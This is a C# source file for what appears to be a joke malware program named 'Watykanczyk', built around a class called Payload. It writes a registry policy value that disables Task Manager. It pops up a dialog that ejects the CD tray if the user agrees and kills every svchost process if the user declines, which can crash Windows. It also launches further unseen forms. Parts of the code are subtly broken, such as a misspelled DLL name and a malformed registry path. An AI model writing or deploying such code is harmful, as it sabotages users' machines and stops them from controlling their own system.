using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace Watykanczyk
{
    class Payload
    {
        [DllImport("winm.dll", EntryPoint = "mciSendString")]
        public static extern int msciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLenght, int hwndCallback);
        public void BlockTaskMgr()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software/Microsoft/Windows/CurrentVersion/Policies/System");
            if (key.GetValue("DisableTaskMgr") == null)
                key.SetValue("DisableTaskMgr", "1");
        }
        public void InsertKremowka()
        {
            DialogResult dialog = MessageBox.Show("Do you want to insert kremówka?", "insert kremówka", MessageBoxButtons.YesNo);
            if(dialog == DialogResult.Yes)
            {
                try
                {
                    int result = msciSendString("set cdaudio door open", null, 0, 0);
                    Thread.Sleep(3000);
                    result = msciSendString("set cdaudio door close", null, 0, 0);
                }
                catch(Exception ex)
                { }
            }
            else 
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach(var proc in processes) 
                {
                    proc.Kill();
                }
            }
        }
        public void payload1() 
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload2() 
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }
}
